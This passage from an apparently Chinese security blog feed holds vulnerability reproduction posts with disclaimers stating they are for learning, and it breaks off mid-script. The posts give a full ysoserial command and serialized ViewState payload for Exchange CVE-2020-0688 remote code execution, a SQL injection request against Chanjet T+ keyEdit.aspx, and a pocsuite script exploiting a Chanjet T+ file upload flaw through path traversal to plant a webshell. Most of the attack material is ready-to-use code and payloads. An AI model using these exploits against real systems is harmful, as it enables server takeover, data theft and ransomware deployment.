class="title">FeG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi0xNiI</span>%2<span class="title">FPg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI</span>%2<span class="title">BDQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U</span>%2<span class="title">BDQogICAgPHNkOlByb2Nlc3M</span>%2<span class="title">BDQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8</span>%2<span class="title">BDQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgY2FsYy5leGUiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M</span>%2<span class="title">BDQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI</span>%2<span class="title">BC5pwrvnjqqEqsSComECClVyJ7Frx</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 创建文件</span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">Downloads</span>\<span class="title">ysoserial</span>-1<span class="title">dba9c4416ba6e79b6b262b758fa75e2ee9008e9</span>\<span class="title">Release</span>&gt;<span class="title">ysoserial.exe</span> -<span class="title">p</span> <span class="title">ViewState</span> -<span class="title">g</span> <span class="title">TextFormattingRunProperties</span> -<span class="title">c</span> &quot;<span class="title">cmd</span> /<span class="title">c</span> <span class="title">echo</span> <span class="title">test</span> &gt; <span class="title">C</span>:\1.<span class="title">txt</span>&quot; --<span class="title">validationalg</span>=&quot;<span class="title">SHA1</span>&quot; --<span class="title">validationkey</span>=&quot;<span class="title">CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF</span>&quot; --<span class="title">generator</span>=&quot;<span class="title">B97B4E27</span>&quot; --<span class="title">viewstateuserkey</span>=&quot;148<span class="title">b5b17</span>-445<span class="title">a</span>-4480-<span class="title">a2cc</span>-<span class="title">a19057786a50</span>&quot; --<span class="title">isdebug</span> --<span class="title">islegacy</span></span></span><br><span class="line"><span class="function"><span class="title">Provided</span> <span class="title">__VIEWSTATEGENERATOR</span> <span class="title">in</span> <span class="title">uint</span>: 3111865895</span></span><br><span class="line"><span class="function"><span class="title">simulateTemplateSourceDirectory</span> <span class="title">returns</span>: /</span></span><br><span class="line"><span class="function"><span class="title">simulateGetTypeName</span> <span class="title">returns</span>: <span class="title">default_aspx</span></span></span><br><span class="line"><span class="function"><span class="title">Calculated</span> <span class="title">pageHashCode</span> <span class="title">in</span> <span class="title">uint</span> (<span class="title">ignored</span>): 3389719348</span></span><br><span class="line"><span class="function">%2<span class="title">FwEyqwcAAQAAAP</span>%2<span class="title">F</span>%2<span class="title">F</span>%2<span class="title">F</span>%2<span class="title">F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADNBTw</span>%2<span class="title">FeG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi0xNiI</span>%2<span class="title">FPg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI</span>%2<span class="title">BDQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U</span>%2<span class="title">BDQogICAgPHNkOlByb2Nlc3M</span>%2<span class="title">BDQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8</span>%2<span class="title">BDQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgY21kIC9jIGVjaG8gdGVzdCAmZ3Q7IEM6XDEudHh0IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8</span>%2<span class="title">BDQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgv76towxj</span>%2<span class="title">B573J47CKdC8RZqXwH9g</span>%3<span class="title">D</span>%3<span class="title">D</span></span></span><br></pre></td></tr></table></figure><p>然后发起请求即可：</p><p>我这边使用的 Postman ，请求内容截图如下所示：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/Exchange/%E3%80%90CVE-2020-0688%E3%80%91exchange%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240523110218003.png" class="" title="image-20240523110218003"><p>执行结果：</p><p>在服务器页面可以看到 calc  成功启动！</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/Exchange/%E3%80%90CVE-2020-0688%E3%80%91exchange%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240523113008585.png" class="" title="执行结果"><p>创建文件：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/Exchange/%E3%80%90CVE-2020-0688%E3%80%91exchange%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/recording.gif" class="" title="recording"><h3 id="相关补丁"><a href="#相关补丁" class="headerlink" title="相关补丁"></a>相关补丁</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30 KB4536989</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2013 Cumulative Update 23 KB4536988</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2016 Cumulative Update 14 KB4536987</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2016 Cumulative Update 15 KB4536987</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2019 Cumulative Update 3 KB4536987</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2019 Cumulative Update 4 KB4536987</span><br></pre></td></tr></table></figure><h3 id="其他问题补充"><a href="#其他问题补充" class="headerlink" title="其他问题补充"></a>其他问题补充</h3><h4 id="1、关于版本"><a href="#1、关于版本" class="headerlink" title="1、关于版本"></a>1、关于版本</h4><p>【2024年5月23日11:39:21】远古漏洞，本文仅限于学习和复现，已修复版本明确，修复之前的版本应该是均可以复现的，参考补丁版本</p><h3 id="2、-VIEWSTATEGENERATOR"><a href="#2、-VIEWSTATEGENERATOR" class="headerlink" title="2、 __VIEWSTATEGENERATOR"></a>2、 __VIEWSTATEGENERATOR</h3><p>在最初版本的时候一直没有这个参数（确实不重要，基本为默认值），造成这一问题的主要原因是没有更新系统补丁KB2919355，更新该补丁后就会出现__VIEWSTATEGENERATOR字段。</p><h4 id="3、-无法创建文件"><a href="#3、-无法创建文件" class="headerlink" title="3、 无法创建文件"></a>3、 无法创建文件</h4><p>大部分复现者只复现到启动计算器，但是却无法创建文件。但经过测试发现问题出在ysoserial.exe的 <code>-c</code> 参数上，虽然在演示过程中可以直接 <code>-c &quot;echo OOOPS!!! &gt; c:/Vuln_Server.txt&quot;</code> 创建文件，让人误以为 <code>-c</code> 是在 cmd 窗口下运行，但是实际上-c实际为“运行”的内容，因此直接echo是不行的，需要 <code>-c &quot;cmd /c echo test &gt; C:\1.txt&quot;</code>，经测试成功创建文件，如图所示：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/Exchange/%E3%80%90CVE-2020-0688%E3%80%91exchange%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240523142926068.png" class="" title="创建文件"><h4 id="URL-Encode编码"><a href="#URL-Encode编码" class="headerlink" title="URL Encode编码"></a>URL Encode编码</h4><p>对生成的payload编码时，需要注意只编码关键的特殊字符即可，如果全编码的话会无法利用成功。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：CVE-2020-0688 漏洞复现及分析&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    <category term="Exchange" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/Exchange/"/>
    
    
  </entry>
  
  <entry>
    <title>【SQL注入防御】</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/SQL%E6%B3%A8%E5%85%A5/%E3%80%90SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E3%80%91index/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/SQL%E6%B3%A8%E5%85%A5/%E3%80%90SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E3%80%91index/</id>
    <published>2024-05-09T07:06:57.037Z</published>
    <updated>2024-05-17T08:58:48.270Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：相关文章整理，思路收集</p></blockquote><span id="more"></span><h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><h3 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h3><ol><li><a href="https://www.freebuf.com/articles/web/256532.html">初学SQL注入之常见的几种注入类型介绍 - FreeBuf网络安全行业门户</a></li></ol><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li><a href="https://cloud.tencent.com/developer/article/2412785">深入理解SQL注入：原理、危害与防御策略-腾讯云开发者社区-腾讯云</a></li></ol><h2 id="相关项目"><a href="#相关项目" class="headerlink" title="相关项目"></a>相关项目</h2><ol><li><a href="https://mp.weixin.qq.com/s/o74SsI9l6_YQH8EHXPW_Dw">sql注入防御——libinjection语义识别分析</a></li><li><a href="https://github.com/client9/libinjection/">client9&#x2F;libinjection: SQL &#x2F; SQLI tokenizer parser analyzer</a></li><li><a href="https://github.com/client9/libinjection/">client9&#x2F;libinjection: SQL &#x2F; SQLI tokenizer parser analyzer</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：相关文章整理，思路收集&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    <category term="SQL注入" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>【1Day】畅捷通 keyEdit.aspx SQL 漏洞</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%901day%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9A%20keyEdit.aspx%20SQL%20%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%901day%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9A%20keyEdit.aspx%20SQL%20%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-05-08T02:52:27.440Z</published>
    <updated>2024-05-09T01:21:30.008Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：畅捷通 keyEdit.aspx SQL 注入漏洞详解</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>如下图所示，请求对应的接口 <code>keyEdit.aspx</code> 时在参数 <code>KeyID</code> 注入 SQL 语句，responses 返回了查询结果。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%901day%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9A%20keyEdit.aspx%20SQL%20%E6%BC%8F%E6%B4%9E/image-20240508112233698.png" class="" title="image-20240508112233698"><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&amp;preload=1 HTTP/1.1</span><br><span class="line">Host: 192.168.19.133:80</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>直接看调用函数，简直不要太明显。<code>KeyID</code> 即请求体参数中的 KeyID 参数的值，这里并没有做任何校验，直接和查询 SQL 拼接。在这里大家也需要注意这种 SQL 语句的写法，太容易被利用，至少也要做参数校验。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%901day%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9A%20keyEdit.aspx%20SQL%20%E6%BC%8F%E6%B4%9E/image-20240508142235684.png" class="" title="image-20240508142235684">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：畅捷通 keyEdit.aspx SQL 注入漏洞详解&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    <category term="畅捷通" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"/>
    
    
  </entry>
  
  <entry>
    <title>【CNVD-2022-60632】畅捷通TPlus任意文件上传漏洞</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-05-07T16:00:00.000Z</published>
    <updated>2024-05-09T01:17:47.126Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：CNVD-2022-60632 畅捷通 T+ 任意文件上传漏洞</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>2022年8月29日和8月30日，畅捷通公司紧急发布安全补丁修复了畅捷通T+软件任意<a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">文件上传漏洞</a>。未经身份认证的攻击者利用该漏洞，通过绕过系统鉴权，在特定配置环境下实现任意文件的上传，从而执行任意代码，获得服务器控制权限。目前，已有用户被不法分子利用该漏洞进行勒索病毒攻击的情况出现。</p><p>CNVD对该漏洞的综合评级为“高危”。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>漏洞影响的产品和版本：<br>畅捷通T+单机版&lt;&#x3D;17.0且使用IIS10.0以下版本。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>POC 使用了  pocsuit 工具，pocsuit 是使用 Python 编写的一个专门用于 POC 编写开发使用的工具集。</p><blockquote><p><strong>如何使用 pocsuit 工具跑 poc?</strong></p><p>以下方 POC 代码为例，运行 POC 命令如下所示：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r .\CNVD-<span class="number">2022</span>-<span class="number">60632</span>.py -u http://localhost:<span class="number">80</span>/ --<span class="built_in">verify</span></span><br></pre></td></tr></table></figure><p>文件架构如下所示：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508145832793.png" class="" title="image-20240508145832793"><p>上传的文件为 bin 目录下的 dll 文件和 compiled 文件。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> OrderedDict, OptString</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChanJetPOC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;0&#x27;</span>  <span class="comment"># ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span></span><br><span class="line">    version = <span class="string">&#x27;1&#x27;</span>  <span class="comment"># 默认为1</span></span><br><span class="line">    author = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># PoC作者的大名</span></span><br><span class="line">    vulDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># 漏洞公开的时间,不知道就写今天</span></span><br><span class="line">    createDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># 编写 PoC 的日期</span></span><br><span class="line">    updateDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># PoC 更新的时间,默认和编写时间一样</span></span><br><span class="line">    references = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># 漏洞地址来源,0day不用写</span></span><br><span class="line">    name = <span class="string">&#x27;畅捷通T+ 任意文件上传&#x27;</span>  <span class="comment"># PoC 名称</span></span><br><span class="line">    appPowerLink = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 漏洞厂商主页地址</span></span><br><span class="line">    appName = <span class="string">&#x27;畅捷通T+&#x27;</span>  <span class="comment"># 漏洞应用名称</span></span><br><span class="line">    appVersion = <span class="string">&#x27;&#x27;&#x27;畅捷通T+单机版&lt;=17.0且使用IIS10.0以下版本&#x27;&#x27;&#x27;</span>  <span class="comment"># 漏洞影响版本</span></span><br><span class="line">    vulType = VUL_TYPE.UPLOAD_FILES  <span class="comment"># 漏洞类型,类型参考见 漏洞类型规范表</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        CNVD-2022-60632 畅捷通T+ 任意文件上传漏洞</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 漏洞简要描述</span></span><br><span class="line">    samples = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># 测试样列,就是用 PoC 测试成功的网站</span></span><br><span class="line">    install_requires = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span></span><br><span class="line">    pocDesc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    category = POC_CATEGORY.EXPLOITS.REMOTE</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        path = <span class="string">&quot;/tplus/SM/SetupAccount/Upload.aspx?preload=1&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        url = self.url + path</span><br><span class="line">        filename = os.listdir(<span class="string">&#x27;bin&#x27;</span>)</span><br><span class="line">        filename_compiled = filename[<span class="number">0</span>]</span><br><span class="line">        filename_dll = filename[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            files = &#123;<span class="string">&quot;File1&quot;</span>: (<span class="string">&quot;../../../bin/&quot;</span>+filename_compiled+<span class="string">&quot;&quot;</span>,<span class="built_in">open</span>(<span class="string">&#x27;bin/&#x27;</span>+filename_compiled, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/jpeg&quot;</span>)&#125;</span><br><span class="line">            resq_0 = requests.post(url=url, headers=headers, files=files, timeout=<span class="number">1000</span>)</span><br><span class="line">            files = &#123;<span class="string">&quot;File1&quot;</span>: (<span class="string">&quot;../../../bin/&quot;</span>+filename_dll+<span class="string">&quot;&quot;</span>,<span class="built_in">open</span>(<span class="string">&#x27;bin/&#x27;</span>+filename_dll, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/jpeg&quot;</span>)&#125;</span><br><span class="line">            resq_1 = requests.post(url=url, headers=headers, files=files, timeout=<span class="number">1000</span>)</span><br><span class="line">            <span class="keyword">if</span> resq_0.status_code == <span class="number">200</span> <span class="keyword">and</span> resq_1.status_code == <span class="number">200</span>:</span><br><span class="line">                result[<span class="string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;</span><br><span class="line">                result[<span class="string">&#x27;VerifyInfo&#x27;</span>][<span class="string">&#x27;URL&#x27;</span>] = url</span><br><span class="line">                result[<span class="string">&#x27;VerifyInfo&#x27;</span>][<span class="string">&#x27;shell&#x27;</span>] = self.url + <span class="string">&#x27;/tplus/shell.aspx?preload=1&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_attack</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span 